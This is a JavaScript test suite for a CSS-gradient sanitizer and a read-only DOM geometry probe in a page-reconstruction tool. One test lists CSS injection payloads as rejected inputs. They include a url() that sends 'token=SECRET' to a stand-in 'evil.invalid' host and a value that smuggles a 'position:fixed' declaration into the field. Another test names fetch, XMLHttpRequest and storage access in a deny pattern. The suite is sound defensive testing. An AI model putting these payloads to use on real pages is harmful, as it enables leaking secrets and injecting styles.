import test from 'node:test';
import assert from 'node:assert/strict';
import {runInNewContext} from 'node:vm';
import {P4_GEOMETRY_PROBE,sanitizeP4Geometry,generateP4Reconstruction} from '../studio/p4-reconstruction.mjs';

const fill='linear-gradient(90deg, rgb(16, 50, 120) 0%, rgb(60, 145, 218) 100%)';
const base=()=>({source:'p4-geometry',viewport:{width:1440,height:900},
 document:{width:1440,height:900},body_color:'rgb(247, 250, 253)',boxes:[
 {tag:'main',depth:1,x:0,y:0,w:1440,h:900,background:'rgb(247, 250, 253)',border_color:'transparent',border_width:'0px',radius:'0px'},
 {tag:'section',depth:2,x:200,y:130,w:700,h:370,background:'transparent',border_color:'transparent',border_width:'0px',radius:'0px'}
 ],titles:[]});

test('P4 supports strictly validated two-stop RGB gradient for standalone scriptless HTML',()=>{
 const input=base(); input.boxes[1].background_image=fill;
 const sanitized=sanitizeP4Geometry(input);
 assert.equal(sanitized.boxes[1].background_image,fill);
 const html=generateP4Reconstruction(input);
 assert.match(html,/background-image:linear-gradient\(90deg, rgb\(16, 50, 120\) 0%, rgb\(60, 145, 218\) 100%\);/);
 assert.match(html,/script-src &#39;none&#39;/);
 assert.doesNotMatch(html,/<script\b|<iframe\b|https?:\/\//);
});
test('P4 gradient is optional: old saved drafts retain byte-exact generated HTML',()=>{
 const old=base(),original=generateP4Reconstruction(old);
 const newer=base();newer.boxes[1].background_image='none';
 assert.equal(generateP4Reconstruction(newer),original);
 assert.equal(Object.hasOwn(sanitizeP4Geometry(newer).boxes[1],'background_image'),false);
});
test('P4 strictly rejects CSS URL, external resource, multi-layer, injected, invalid channels and angles',()=>{
 const attacks=[
 'url(https://evil.invalid/token=SECRET)',
 'linear-gradient(90deg, rgb(16, 50, 120), rgb(60, 145, 218)), url(https://bad.invalid)',
 'linear-gradient(90deg, rgb(16, 50, 120), rgb(60, 145, 218));position:fixed',
 'linear-gradient(361deg, rgb(16, 50, 120), rgb(60, 145, 218))',
 'linear-gradient(90deg, rgb(999, 50, 120), rgb(60, 145, 218))',
 'linear-gradient(to right, red, blue)',
 'radial-gradient(circle, red, blue)',
 'linear-gradient(90deg, rgba(16,50,120,.5), rgb(60,145,218))',
 'linear-gradient(90deg, var(--private), rgb(60,145,218))',
 'linear-gradient(90deg, rgb(16,50,120) 23%, rgb(60,145,218) 90%)'
 ];
 for(const bad of attacks){
  const input=base();input.boxes[1].background_image=bad;
  const out=sanitizeP4Geometry(input);
  assert.equal(Object.hasOwn(out.boxes[1],'background_image'),false,bad);
  const html=generateP4Reconstruction(input);
  assert.ok(!html.includes(bad));
  assert.doesNotMatch(html,/evil\.invalid|bad\.invalid|SECRET|background-image:/);
 }
});
test('P4 preserves optional gradient only for observed large regions, not bogus small objects',()=>{
 const input=base();
 input.boxes.push({...input.boxes[1],tag:'img',background_image:fill});
 input.boxes[1].background_image=fill;
 input.primitives=[{x:205,y:190,w:30,h:90,background:'rgb(20, 30, 40)',radius:'0px',background_image:fill}];
 const out=sanitizeP4Geometry(input);
 assert.equal(out.boxes.length,2);
 assert.equal(out.primitives?.length??0,0);
 assert.equal(out.boxes[1].background_image,fill);
});
test('read-only DOM probe observes gradient-only painted section and reads no confidential text',()=>{
 const root={tagName:'BODY',parentElement:null,textContent:''};
 const main={tagName:'MAIN',parentElement:root,textContent:'',
   getBoundingClientRect:()=>({left:0,top:0,width:1440,height:900})};
 const section={tagName:'SECTION',parentElement:main,textContent:'Never copy this sensitive body content',
   getBoundingClientRect:()=>({left:200,top:130,width:700,height:370})};
 const ctx={document:{body:root,documentElement:{scrollWidth:1440,scrollHeight:900},
   querySelectorAll:()=>[main,section]},
  getComputedStyle:n=>({
   display:'block',visibility:'visible',opacity:'1',
   backgroundColor:n===section?'rgba(0, 0, 0, 0)':'rgb(247, 250, 253)',
   backgroundImage:n===section?fill:'none',
   borderTopLeftRadius:'0px',borderTopWidth:'0px',borderTopColor:'transparent',boxShadow:'none'}),
  innerWidth:1440,innerHeight:900,scrollX:0,scrollY:0,parseFloat};
 const raw=runInNewContext(P4_GEOMETRY_PROBE,ctx,{timeout:1000});
 const out=sanitizeP4Geometry(raw);
 const gradient=out.boxes.find(b=>b.tag==='section');
 assert.ok(gradient,'transparent-background gradient-only section must be observed');
 assert.equal(gradient.background_image,fill);
 assert.doesNotMatch(JSON.stringify(out),/Never copy this sensitive body content/);
 assert.doesNotMatch(P4_GEOMETRY_PROBE,/\bfetch\s*\(|\bXMLHttpRequest\b|\bclick\s*\(|\.value\b|localStorage|sessionStorage|\.innerHTML\b/);
});
